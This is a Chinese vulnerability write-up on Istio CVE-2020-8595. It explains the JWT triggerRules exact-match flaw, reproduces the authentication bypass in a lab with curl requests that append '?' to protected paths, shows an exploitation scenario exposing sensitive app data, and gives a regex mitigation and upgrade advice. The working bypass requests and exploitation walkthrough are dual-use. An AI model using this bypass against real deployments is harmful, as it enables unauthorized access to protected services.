# 一．概述

在过去两年，以Istio为代表的Service Mesh的问世因其出色的架构设计及火热的开源社区在业界迅速聚集了一批拥簇者。Service
Mesh不仅可以降低应用变更过程中因为耦合产生的冲突（传统单体架构应用程序代码与应用管理代码紧耦合），也使得每个服务都可以有自己的团队从而独立进行运维。

在给技术人员带来这些好处的同时，Istio的安全问题也令人堪忧，正如人们所看到的，微服务由于将单体架构拆分为众多的服务，每个服务都需要访问控制和认证授权，这些威胁无疑增加了安全防护的难度。

Istio在2019年一月份和九月份相继曝出三个未授权访问漏洞（CVE-2019-12243、CVE-2019-12995、CVE-2019-14993），其中CVE-2019-12995和CVE-2019-14993均与Istio的JWT机制相关，看来攻击者似乎对JWT情有独钟。2月4日，由Aspen
Mesh公司的一名员工发现并提出Istio的JWT认证机制再次出现服务间未经授权访问的Bug，并最终提交了CVE，CVSS机构也将此CVE最终评分为9.0，可见此漏洞之严重性。

本文以JWT作为出发点，首先对其进行介绍，进而延伸到Istio的JWT认证机制及对此次漏洞的剖析，最后通过实验还原CVE-2020-8595漏洞的攻击场景。

# 二．背景

JSON Web
Token（JWT）是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。JWT也是目前最流行的跨域认证解决方案，对于认证问题，业界一般采用的模式为服务端存储session，客户端通过服务端返回的session_id（即cookie）与服务端进行身份验证从而得知用户身份。这种模式目前存在的问题是扩展性不好，单机没有问题，但在分布式集群环境中是要求session数据共享的。

举个例子来说明，A网站和B网站是同一家公司的关联服务，现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，一种解决办法是采用session将数据持久化，写入数据库，当服务收到请求时都向持久层请求数据，这种方式缺点是工作量大，另外万一数据库挂掉就会存在单点失败问题。另外一种方案是索性将数据保存在客户端，服务端不保存数据了，每次请求都发回服务端，JWT就是这种方案的一个代表。

JWT的原理也较好理解，服务器认证之后会返回一个json对象并发送给客户端，这样每次与服务端通信时都要以此json对象作为凭证去访问，当然考虑到安全问题（用户可能会对json数据进行篡改），服务端生成json对象时会加上签名，故服务端不保存session了，且变为无状态，达到了易于扩展的目的。

Istio架构中的JWT认证主要依赖于JWKS（JSON Web Key Set），
JWKS是一组密钥**，其中包含用于验证JWT的公钥，在Istio中JWT认证策略通常通过配置一个.yaml文件实现，为了便于理解，以下是一个简单的jwt认证策略配置：

    
    
    issuer: https://example.com
    
    
    jwksUri: https://example.com/.well-known/jwks.json
    
    
    triggerRules:
    
    
    - excludedPaths:
    
    
      - exact: /status/version
    
    
      includedPaths:
    
    
      - prefix: /status/

其中：

issuer：代表发布JWT的发行者；

jwksUri： 获取JWKS的地址，用于验证JWT的签名，jwksUri可以为远程服务器地址也可以在本地地址，其内容通常为域名或url，
本地会存在某个服务的某路径下；

triggerRules（重要）：此参数意思为Istio使用JWT验证请求的触发规则列表，如果满足匹配规则就会进行JWT验证，此参数使得服务间认证弹性化，用户可以按需配置下发规则，以上策略triggerRules部分的意思为对于任何带有“/status/”前缀的请求路径，除了/status/version以外，
都需要JWT认证「此次漏洞也是出在这个triggerRules机制上」

关于triggerRules配置详细内容可以参考https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/

# 三．漏洞说明

关于CVE-2020-8595漏洞，Istio的官方声明为：

A bug in Istio’s Authentication Policy exact path matching logic allows
unauthorized access to resources without a valid JWT token. This bug affects
all versions of Istio that support JWT Authentication Policy with path based
triggeRules. The logic for the exact path match in the Istio JWT filter
includes query strings or fragments instead of stripping them off before
matching. This means attackers can bypass the JWT validation by appending ? or
# characters after the protected paths.

从中可以看出问题出现在Istio JWT策略配置中的triggeRules机制，triggeRules包含请求url的字符串匹配机制，主要有以下四种：

![640.png](https://image.3001.net/images/20200319/1584613841_5e7349d1c9b45.png!small)图1
triggeRules字符串匹配类型

「exact」是导致这次漏洞的罪魁祸首，它代表完全匹配的字符串才可以满足要求，
而完全匹配原则是需要包含url后面所附带的参数（“?”）以及fragments定位符（"#"），而不是在匹配之前将“?”和“#”隔离的内容进行分离，这里为了便于理解，举一个完整的url例子说明，如下所示：

![图片1.png](https://image.3001.net/images/20200319/1584613841_5e7349d1d1bd9.png!small)
图2 完整的url示意图

triggeRules中exact匹配的内容应当“/over/there?name=ferret#nose”，而不是“/over/there”，Istio的JWT认证策略在填写triggeRules时只考虑到了path部分，而省略了query和fragment部分，从而攻击者可以通过在受保护的path后添加“?”或“#”进行绕过从而达到未授权（JWT）访问。以Istio的JWT认证策略举例更容易理解，如下所示：

指定JWT保护路径的原始认证策略如下：

\---
apiVersion: "authentication.istio.io/v1alpha1"

kind: "Policy"

metadata:

name: "jwt-example"

namespace: istio-system

spec:

targets:

\- name: istio-ingressgateway #需要在Istio网关入口处部署JWT认证策略

origins:

\- jwt:

issuer: "testing@secure.istio.io" #JWT颁发者

jwksUri:
"https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
#用于验证JWT的JWKS所在URL

trigger_rules: #JWT验证请求的触发规则列表

\- included_paths: #代表只有访问包含以下路径规则才需要JWT认证

\- exact: /productpage
#满足路径与productpage完全匹配后，才可以访问productpage服务（需要JWT认证，没有有效JWT无法访问）

问题出在最后一行，如果exact处的url为“/productpage?a=1”或者“/productpage?b=1#go”，那么按照匹配原则，访问路径应该是定位到

https://example.com//productpage?a=1及https://example.com/productpage?b=1#go”

由于这两个url都属于“/productpage”路径下，那么应该当通过JWT身份认证后才可以访问，但因为服务端Istio没有做好防护，将query部分和fragment部分与path进行分类处理了，认为“/productpage?a=1”
不属于“/productpage”这个path，
并且认为其没有添加JWT策略所以不需要进行认证，从而攻击者可以通过在path后添加“#”或“?”轻松绕过JWT认证进行未授权访问。

# 四．实验验证

## 4.1 环境

Istio版本：v1.4.2

Kubernetes版本：v1.16.2

集群主机： node1（Master）/node2 (Slave)

操作系统：Ubuntu 18.04

## 4.2 准备工作

### 4.2.1创建foo命名空间

kubectl create ns foo

### 4.2.2创建httpbin服务

httpbin.yaml 在istio/istio-1.4.2/samples/httpbin路径下

kubectl apply -f <(istioctl kube-inject -f httpbin.yaml) -n foo

### 4.2.3创建httpbin gateway

#创建httpbin gateway

kubectl apply -f - <<EOF

apiVersion: networking.istio.io/v1alpha3

kind: Gateway

metadata:

name: httpbin-gateway

namespace: foo

spec:

selector:

istio: ingressgateway # use Istio default gateway implementation

servers:

\- port:

number: 80

name: http

protocol: HTTP

hosts:

\- "*"

EOF

### 4.2.4暴露httpbin服务

#通过ingress gateway将httpbin服务暴露在外部可访问

kubectl apply -f - <<EOF

apiVersion: networking.istio.io/v1alpha3

kind: VirtualService

metadata:

name: httpbin

namespace: foo

spec:

hosts:

\- "*"

gateways:

\- httpbin-gateway

http:

\- route:

\- destination:

port:

number: 8000

host: httpbin.foo.svc.cluster.local

EOF

### 4.2.5对httpbin服务部署JWT策略

cat <<EOF | kubectl apply -n foo -f -
apiVersion: "authentication.istio.io/v1alpha1"

kind: "Policy"

metadata:

name: "jwt-example"

spec:

targets:

\- name: httpbin

origins:

\- jwt:

issuer: "testing@secure.istio.io"

jwksUri:
"https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"

trigger_rules:

\- included_paths:

\- exact: /ip

principalBinding: USE_ORIGIN

EOF

### 4.2.6设定环境变量

export INGRESS_HOST=http://192.168.19.11:31380

## 4.3 场景复现

首先我们先访问一个未加JWT认证的url path“/user-agent”：

root@node2:~# curl -v $INGRESS_HOST/user-agent

* Trying 192.168.19.11...

* TCP_NODELAY set

* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)

> GET /user-agent HTTP/1.1

> Host: 192.168.19.11:31380

> User-Agent: curl/7.58.0

> Accept: */*

>

< HTTP/1.1 200 OK

< server: istio-envoy

< date: Thu， 05 Mar 2020 06:47:22 GMT

< content-type: application/json

< content-length: 34

< access-control-allow-origin: *

< access-control-allow-credentials: true

< x-envoy-upstream-service-time: 7

<

{

"user-agent": "curl/7.58.0"

}

可以看到返回200状态码，访问成功。

接着再访问加了JWT认证的url path "/ip":

Origin authentication failed.root@node2:~# curl -v $INGRESS_HOST/ip

* Trying 192.168.19.11...

* TCP_NODELAY set

* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)

> GET /ip HTTP/1.1

> Host: 192.168.19.11:31380

> User-Agent: curl/7.58.0

> Accept: */*

>

< HTTP/1.1 401 Unauthorized

< content-length: 29

< content-type: text/plain

< date: Thu， 05 Mar 2020 06:49:37 GMT

< server: istio-envoy

< x-envoy-upstream-service-time: 0

可以看到服务端返回401 Unauthorized拒绝访问，原因是需要认证授权，证明策略生效了。

我们再访问JWT认证下的path + query(通过添加”?“符号)

root@node2:~# curl -v $INGRESS_HOST/ip?a=1

* Trying 192.168.19.11...

* TCP_NODELAY set

* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)

> GET /ip?a=1 HTTP/1.1

> Host: 192.168.19.11:31380

> User-Agent: curl/7.58.0

> Accept: */*

>

< HTTP/1.1 200 OK

< server: istio-envoy

< date: Thu， 05 Mar 2020 06:53:00 GMT

< content-type: application/json

< content-length: 29

< access-control-allow-origin: *

< access-control-allow-credentials: true

< x-envoy-upstream-service-time: 5

<

{

"origin": "10.244.0.0"

}

可以看到返回为200状态码，说明不需要JWT的认证也可以访问ip这个path下的内容，从而完成绕过。

同理在url后添加“#”符号也完成绕过。

## 4.4验证PoC

绿盟君在网上找到一个PoC可以验证此漏洞，此脚本由Google Istio团队Francois Pesce 提供：

https://gist.githubusercontent.com/nrjpoddar/62114128d12478abe8366404bf547b77/raw/1475213902932cc157f49fc0584b8f231e887394/check.sh

实验结果如下：

root@node2:/home/puming/test# ./test_istio_jwt_cve.sh istio/proxyv2:1.4.2

/home/puming/test/cve-2020-8595.VzW0Mi /home/puming/test

./test_istio_jwt_cve.sh: line 260: warning: here-document at line 148
delimited by end-of-file (wanted `EOF')

Sleeping for 5 seconds so the docker container is up and running

[CVE-2020-8595] Vulnerable

3d74c863fdb819f2bcabb8334b1e8f4fdd56c9d0908918ef4f900131fb21c814

/home/puming/test

确实可以证明Istio环境存在漏洞，感兴趣的读者可以自己尝试。

## 4.5 漏洞利用

未授权的访问漏洞经常会使攻击者有机可乘，通过未授权的资源访问达到一些目的，绿盟君将通过一个简单实验说明此漏洞的可利用性。在Istio环境中，首先部署了一个基于django框架的Web应用，此Web应用因为存在某接口（$INGRESS_HOST/apps）的未授权访问漏洞以及逻辑缺陷导致敏感信息泄漏，
通过直接访问

curl -v $INGRESS_HOST/apps?manifest=com.canonical.ubuntu.desktop

curl -v $INGRESS_HOST/apps?manifest=com.mozilla.mozdef 可以将漏洞信息还原，如下所示：

![图片2.png](https://image.3001.net/images/20200319/1584613841_5e7349d1dc7af.png!small)  
![图片3.png](https://image.3001.net/images/20200319/1584613842_5e7349d26d2d8.png!small)

图3 敏感信息泄漏

通过上图的红框部分可以看出，该网站的app详细信息接口由于未授权访问漏洞暴露了app的敏感信息，例如端口号、操作系统版本、用户名密码等。对于网站开发人员来说，可能并不知此漏洞的存在，于是潜在的危险出现了，以下将还原整个过程，首先将此应用部署至Istio，通过下发JWT策略对”/apps”进行身份认证，配置如下：

cat <<EOF | kubectl apply -n foo -f -
apiVersion: "authentication.istio.io/v1alpha1"

kind: "Policy"

metadata:

name: "jwt "

spec:

targets:

\- name: web-test

origins:

\- jwt:

issuer: "testing@secure.istio.io"

jwksUri:
"https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"

trigger_rules:

\- included_paths:

\- exact: /apps

principalBinding: USE_ORIGIN

EOF

配置成功后进行访问，可以看到访问失败，证明JWT策略生效了，如下所示：

root@node2:~# curl -v $INGRESS_HOST/apps/

* Trying 192.168.19.11...

* TCP_NODELAY set

* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)

> GET /apps/ HTTP/1.1

> Host: 192.168.19.11:31380

> User-Agent: curl/7.58.0

> Accept: */*

>

< HTTP/1.1 401 Unauthorized

< content-length: 29

< content-type: text/plain

< date: Thu， 07 Mar 2020 04:49:37 GMT

< server: istio-envoy

< x-envoy-upstream-service-time: 0

以攻击者视角尝试访问”/apps?”：

root@node2:~# curl -v $INGRESS_HOST/apps?

* Trying 192.168.19.11...

* TCP_NODELAY set

* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)

> GET /apps? HTTP/1.1

> Host: 192.168.19.11:31380

> User-Agent: curl/7.58.0

> Accept: */*

>

< HTTP/1.1 200 OK

< server: istio-envoy

< date: Thu， 07 Mar 2020 04:53:00 GMT

< content-type: application/json

< content-length: 29

< access-control-allow-origin: *

< access-control-allow-credentials: true

< x-envoy-upstream-service-time: 5

<

可以成功访问，证明了Istio的未授权访问漏洞确实存在，于是攻击者可以完美绕过JWT认证并且成功利用到程序自身的漏洞，进而访问到每个app的敏感信息，一旦攻击者拥有这些敏感信息例如用户名密码，便可直接对网站上的app进行访问，植入后门，后果不堪设想。

以上只是一个简单的漏洞利用场景，现实攻击中，开发人员还有可能因为疏忽在某访问路径下放置密钥信息，攻击者一旦拿到密钥便可通过ssh登录到其它主机从而展开持续性攻击，所以Istio所爆的漏洞只是为攻击者打开了一扇门，用户自己的应用程序安全性才是最重要的。

# 五．修复方法

通过添加正则临时缓解

由于triggeRules中url的字符串匹配机制支持正则表达式，所以我们可以加上正则防止绕过：  

\- jwt:

issuer: "testing@secure.istio.io"

jwksUri:
"https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"

trigger_rules:

\- included_paths:

\- regex: '/productpage(\?.*)?' #

\- regex: '/productpage(#.*)?' #

此正则表达式满足 path + query + fragment 完全匹配，我们可以简单实验下可行性：

给exact路径添加正则匹配前先将之前的策略删除。

root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# kubectl delete
policy.authentication.istio.io jwt-example -n foo

policy.authentication.istio.io "jwt-example" deleted

root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# cat <<EOF | kubectl
apply -n foo -f -
> apiVersion: "authentication.istio.io/v1alpha1"

> kind: "Policy"

> metadata:

> name: "jwt-example"

> spec:

> targets:

> \- name: httpbin

> origins:

> \- jwt:

> issuer: "testing@secure.istio.io"

> jwksUri:
> "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"

> trigger_rules:

> \- included_paths:

> \- regex: '/ip(\?.*)?'

> \- regex: '/ip(#.*)?'

> principalBinding: USE_ORIGIN

> EOF

policy.authentication.istio.io/jwt-example created

再访问ip的完整URL，如下所示，可以看到服务端返回401 Unauthorized拒绝访问，说明正则匹配生效，'/ip(#.*)?'同理。

root@node2:~# curl -v $INGRESS_HOST/ip?a=1

* Trying 192.168.19.11...

* TCP_NODELAY set

* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)

> GET /ip?a=1 HTTP/1.1

> Host: 192.168.19.11:31380

> User-Agent: curl/7.58.0

> Accept: */*

>

< HTTP/1.1 401 Unauthorized

< content-length: 29

< content-type: text/plain

< date: Thu， 05 Mar 2020 07:02:58 GMT

< server: istio-envoy

< x-envoy-upstream-service-time: 0

升级Istio至1.4.4和1.3.8以及之后的版本  

# 六. 漏洞评估

CVSS评分为9.0分[6]，级别定位严重，绿盟君认为未经认证授权访问会带来很多严重性后果，如果是授权页面的话，其它用户可以随意访问，从而会引起重要权限可能被操作、网站目录、数据库等敏感信息泄漏的风险。在Kubernetes环境下，容器为运行Pod的载体，由于Pod内容器之间可以通过Localhost互相访问，所以一旦有一个容器失陷，进而会传播到Pod中的其它容器，如果是特权容器，还有可能风险更为严重，所以此漏洞在微服务环境中风险较大。

# 七. 总结

CVE-2020-8595漏洞让Istio的安全管理机制脆弱性得以暴露，那么JWT自身又存在哪些安全风险呢？绿盟君通过对JWT的研究了解到JWT本身是不加密的（加密只有JWT的Signature部分）并且是无状态的，所以JWT很容易泄漏并且被利用，虽然Istio的mTLS机制可以解决服务间通讯的流量加密问题，但这样JWT就足够安全了吗？答案是不一定，毕竟谁也不能确保不会把JWT硬编码在源码中。现实攻击手段变幻莫测，唯有知己知彼方可百战百胜，这就需要从自身培养安全意识做起，防护应由内而外，只有这样，我们的系统才够安全。

# 八．参考文献

[1] https://blog.christianposta.com/how-a-service-mesh-can-help-with-microservices-security/

[2] http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html

[3]
https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/#Jwt

[4] https://tools.ietf.org/html/rfc7517

[5] https://istio.io/docs/tasks/security/authentication/authn-policy/#enable-mutual-tls-per-namespace-or-service

[6] https://istio.io/news/security/istio-security-2020-001/

[7] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8595

[8] https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-8595

[9] https://aspenmesh.io/aspen-mesh-1-4-4-1-3-8-security-update/

[10]
https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/

[11]
https://gist.githubusercontent.com/nrjpoddar/62114128d12478abe8366404bf547b77/raw/1475213902932cc157f49fc0584b8f231e887394/check.sh

[12] https://istio.io/news/security

  

